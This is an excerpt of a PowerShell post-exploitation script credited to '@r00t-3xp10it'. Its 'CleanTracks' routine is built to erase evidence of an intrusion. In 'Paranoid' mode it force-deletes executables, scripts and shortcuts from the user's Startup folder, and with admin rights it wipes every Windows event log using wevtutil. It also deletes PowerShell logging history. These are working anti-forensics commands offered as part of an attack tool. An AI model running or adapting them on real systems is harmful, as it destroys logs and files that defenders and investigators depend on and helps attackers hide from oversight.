...
If($CleanTracks -ieq "Clear" -or $CleanTracks -ieq "Paranoid")
{
   ...
   Else
   {
      ...
      Write-Host "  => error: fail to delete PS Logging History!" -ForegroundColor Red -BackgroundColor Black
   }
   ...
   If($CleanTracks -ieq "Paranoid")
   {
      ...
      .SYNOPSIS 
         Author: @r00t-3xp10it
         Helper - Delete ALL eventvwr logfiles + startup items.
      #>

      #Delete all artifacts from 'StartUp' directory
      $PersistePath = "$Env:APPDATA\Microsoft\Windows" + "\Start Menu\Programs\" + "Startup\*" -join ''
      Get-ChildItem -Path "$PersistePath" -Include *.exe,*.bat,*.vbs,*.dll,*.lnk,*.inf,*.hta,*.ps1 -EA SilentlyContinue | ForEach-Object {
         Remove-Item -Path $_.FullName -Force|Out-Null
      ...
      If($IsClientAdmin)
      {
         ...
         wevtutil el|Foreach-Object {$Count++;wevtutil cl "$_"}
         Write-Host ""
      }
   }
